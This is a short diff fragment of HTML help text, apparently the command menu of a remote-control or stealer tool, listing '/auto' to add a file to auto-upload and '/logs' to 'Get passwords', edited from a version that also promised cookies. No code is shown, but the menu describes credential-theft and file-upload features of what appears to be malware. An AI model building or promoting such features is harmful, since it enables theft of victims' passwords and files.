@@ -33,5 +33,5 @@
 
 <b><p>/auto - add file to auto-upload</p></b>
 
-<b><p>/logs - Get passwords and cookies(next update)</p></b>
+<b><p>/logs - Get passwords</p></b>
 
